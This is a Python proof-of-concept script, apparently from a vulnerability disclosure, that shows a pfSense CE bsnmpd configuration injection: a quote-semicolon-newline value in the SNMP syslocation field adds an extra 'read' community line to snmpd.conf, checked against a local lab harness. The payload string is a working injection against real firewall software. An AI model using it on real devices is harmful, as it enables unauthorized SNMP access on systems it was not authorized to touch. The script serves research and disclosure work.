#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: pfsense-bsnmpd-conf (Medium: 5.4)
#  Vendor: pfSense CE (Netgate)
#  Versions: pfSense CE 2.9.0-DEVELOPMENT
#  Impact: services_snmpd_configure interpolates location := "{$snmpdcfg['syslocation']}"
#  Requires: `page-services-snmp`. CSRF-magic on POST unless noted. WebGUI PHP-FPM is root.
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "pfsense-bsnmpd-conf"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove pfSense bsnmpd location quote/semicolon injects extra snmpd.conf lines."""


import json
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

LABEL = "PFSENSE-BSNMPD-CONF"
WITNESS = "PFSENSE-BSNMPD-CONF-WITNESS"
HOST = "127.0.0.1"
PORT = 19220
PIN_SHA = "9363ac5b8651a1c7a333180425ce7719070f95f9"
PIN_VERSION = "2.9.0-DEVELOPMENT"
CONTROL_LOCATION = "office"
TRIGGER_LOCATION = 'office";\nread := "' + WITNESS
LOCATION_MACRO = 'location := "{$snmpdcfg[\'syslocation\']}"'
CONTACT_MACRO = 'contact := "{$snmpdcfg[\'syscontact\']}"'
READ_MACRO = 'read := "{$snmpdcfg[\'rocommunity\']}"'
TRAP_MACRO = 'trap := "{$snmpdcfg[\'trapstring\']}"'
HASH_GATE = 'if (strstr($_POST[\'syslocation\'], "#")) {'
BSNMPD_ARGV = 'mwexec("/usr/sbin/bsnmpd -c {$g[\'varetc_path\']}/snmpd.conf"'


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def http(
    path: str,
    data: dict[str, str] | None = None,
    timeout_s: float = 20.0,
) -> tuple[int, bytes]:
    url = f"http://{HOST}:{PORT}{path}"
    body = None
    headers: dict[str, str] = {}
    method = "GET"
    if data is not None:
        body = urllib.parse.urlencode(data).encode("utf-8")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        method = "POST"
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout_s) as resp:
            return int(resp.status), resp.read()
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read()
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return 0, str(exc).encode()


def load_json(path: str, data: dict[str, str] | None = None) -> dict[str, Any]:
    status, blob = http(path, data=data)
    text = blob.decode("utf-8", "replace")
    if status != 200:
        raise RuntimeError(f"{path} status={status} body={text[:200]}")
    payload = json.loads(text)
    if not isinstance(payload, dict):
        raise RuntimeError(f"{path} not-object")
    return payload


def clip(value: Any, limit: int = 240) -> str:
    text = value if isinstance(value, str) else json.dumps(value, separators=(",", ":"))
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def as_str_list(value: Any) -> list[str]:
    if not isinstance(value, list):
        return []
    return [str(item) for item in value]


def assert_pin(writer: str, gui: str) -> str | None:
    for needle in (LOCATION_MACRO, CONTACT_MACRO, READ_MACRO, TRAP_MACRO, BSNMPD_ARGV):
        if needle not in writer:
            return f"writer-missing:{needle}"
    if HASH_GATE not in gui:
        return "gui-hash-gate-missing"
    if "addslashes($snmpdcfg['syslocation'])" in writer:
        return "writer-addslashes-syslocation"
    if "escapeshellarg($snmpdcfg['syslocation'])" in writer:
        return "writer-escapeshellarg-syslocation"
    return None


def extra_community_line(lines: list[str]) -> bool:
    want = f'read := "{WITNESS}"'
    return any(line.strip() == want for line in lines)


def main() -> int:
    log(f"label={LABEL} url=http://{HOST}:{PORT} pin={PIN_VERSION} sha={PIN_SHA}")
    log(f"control={CONTROL_LOCATION!r}")
    log(f"trigger={TRIGGER_LOCATION!r}")

    try:
        ping = load_json("/ping")
    except (RuntimeError, json.JSONDecodeError) as exc:
        return fail(f"ping {exc}")
    if ping.get("pong") != "pong":
        return fail("ping-no-pong")
    if ping.get("sha") != PIN_SHA:
        return fail(f"ping-sha={ping.get('sha')}")
    if ping.get("version") != PIN_VERSION:
        return fail(f"ping-version={ping.get('version')}")
    log(f"ioc privilege={ping.get('privilege')} conf_path={ping.get('conf_path')}")

    status, writer_blob = http("/pin/writer")
    writer = writer_blob.decode("utf-8", "replace")
    log(f"ioc pin-writer-status={status} bytes={len(writer)}")
    if status != 200:
        return fail("pin-writer-http")
    status, gui_blob = http("/pin/gui")
    gui = gui_blob.decode("utf-8", "replace")
    log(f"ioc pin-gui-status={status} bytes={len(gui)}")
    if status != 200:
        return fail("pin-gui-http")
    source_reason = assert_pin(writer, gui)
    if source_reason:
        return fail(source_reason)
    log("ioc pin-source-match=yes")

    try:
        control = load_json(
            "/run", {"case": "control", "location": CONTROL_LOCATION}
        )
    except (RuntimeError, json.JSONDecodeError) as exc:
        return fail(f"control {exc}")
    control_locs = as_str_list(control.get("location_lines"))
    control_comms = as_str_list(control.get("community_lines"))
    control_extra = as_str_list(control.get("extra_witness_community"))
    control_mwexec = as_str_list(control.get("mwexec"))
    log(f"ioc control-errors={clip(control.get('errors'))}")
    log(f"ioc control-location-lines={clip(control_locs)}")
    log(f"ioc control-community-lines={clip(control_comms)}")
    log(f"ioc control-extra={clip(control_extra)}")
    log(f"ioc control-mwexec={clip(control_mwexec)}")
    control_one = (
        not control.get("errors")
        and control.get("write_config") is True
        and control_locs == ['location := "office"']
        and int(control.get("location_line_count") or 0) == 1
        and control_comms == ['read := "public"']
        and not control.get("witness_in_conf")
        and not control_extra
        and not extra_community_line(as_str_list(control.get("lines")))
    )
    if not control_one:
        return fail("control-one-syslocation=no")
    log("ioc control-one-syslocation=yes")

    try:
        trigger = load_json(
            "/run", {"case": "trigger", "location": TRIGGER_LOCATION}
        )
    except (RuntimeError, json.JSONDecodeError) as exc:
        return fail(f"trigger {exc}")
    trigger_locs = as_str_list(trigger.get("location_lines"))
    trigger_comms = as_str_list(trigger.get("community_lines"))
    trigger_extra = as_str_list(trigger.get("extra_witness_community"))
    trigger_lines = as_str_list(trigger.get("lines"))
    trigger_mwexec = as_str_list(trigger.get("mwexec"))
    log(f"ioc trigger-errors={clip(trigger.get('errors'))}")
    log(f"ioc trigger-location-lines={clip(trigger_locs)}")
    log(f"ioc trigger-community-lines={clip(trigger_comms)}")
    log(f"ioc trigger-extra={clip(trigger_extra)}")
    log(f"ioc trigger-mwexec={clip(trigger_mwexec)}")
    log(f"ioc trigger-conf={clip(trigger.get('conf'), 400)}")
    quote_semi = '"' in TRIGGER_LOCATION and ";" in TRIGGER_LOCATION
    extra_line = extra_community_line(trigger_lines)
    public_kept = 'read := "public"' in trigger_comms
    trigger_extra_community = (
        quote_semi
        and not trigger.get("errors")
        and trigger.get("write_config") is True
        and extra_line
        and public_kept
        and int(trigger.get("community_line_count") or 0) >= 2
        and trigger.get("witness_in_conf") is True
        and any(WITNESS in line for line in trigger_extra)
        and not any("; w" in cmd or "/bin/w" in cmd for cmd in trigger_mwexec)
    )
    if not trigger_extra_community:
        return fail("trigger-extra-community=no")
    log("ioc trigger-extra-community=yes")

    try:
        oracle = load_json("/oracle")
    except (RuntimeError, json.JSONDecodeError) as exc:
        return fail(f"oracle {exc}")
    if not extra_community_line(as_str_list(oracle.get("community_lines"))):
        return fail("oracle-extra-community-missing")

    log(
        "SUCCESS PFSENSE-BSNMPD-CONF "
        "control-one-syslocation=yes trigger-extra-community=yes "
        "PFSENSE-BSNMPD-CONF-WITNESS"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

